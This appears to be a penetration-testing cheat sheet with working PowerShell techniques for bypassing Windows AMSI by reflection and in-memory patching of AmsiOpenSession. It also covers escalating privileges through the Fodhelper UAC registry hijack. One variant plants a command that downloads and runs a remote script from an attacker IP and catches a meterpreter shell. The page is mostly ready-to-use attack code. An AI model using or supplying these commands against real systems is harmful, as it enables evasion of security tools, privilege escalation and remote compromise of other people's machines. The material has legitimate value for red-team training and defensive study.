---
layout:     post
author:     0x5c4r3
type: docs
permalink: Bypass_AMSI
---


<span style="font-size: 35px; color:red"><b>Bypassing AMSI</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Powershell OneLiner</b></span>
Simple script to deactivate AMSI corrupting its context structure (replacing the first 4 Bytes "AMSI" with 0):
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
OR
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

You can test - from Powershell - that it works typing <span style="color:red">'amsiUtils'</span>, <span style="color:red">'amsicontext'</span> or <span style="color:red">'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'</span> or <span style="color:red">'invoke-mimikatz'</span> in powershell and see if any of these gets flagged.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Binary Patching</b></span>
Directly changing the first instruction <span style="color:red">test RDX,RDX</span> to <span style="color:red">XOR RAX,RAX</span>, forcing the execution flow to the error branch, which will disable AMSI.

Attack:
1) Obtain the memory address of AMSIOpenSession
2) Modify the memory permission where AMSIOpenSession is located
3) Modify the 3 bytes at that location

```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Fodhelper UAC Bypass</b></span>
Fodhelper.exe is an application that helps managing optional features like region-specific keyboard settings.
It's vulnerable since it deals directly with the current user's registry.

EXPLOIT in 3 steps:
```powershell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
```

```powershell
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```

```powershell
C:\Windows\System32\fodhelper.exe
```

MSFconsole has an exploit for this to increase a revshell (that you already spawned) to HIGH integrity :  `exploit/windows/local/bypassuac_fodhelper`
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>FodHelper UAC Bypass + AMSI Bypass</b></span>
To bypass AMSI using the exploit against FodHelper, run these commands (the <span style="color:red">run.txt</span> contains the Powershell Shellcode Runner with AMSI bypass at the beginning of it - or the longer one, up to you):
```powershell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force
```

```powershell
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```

```powershell
C:\Windows\System32\fodhelper.exe
```

And get the shell using msfconsole. Configure the multi/handler (meterpreter) like so:
```shell
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
```

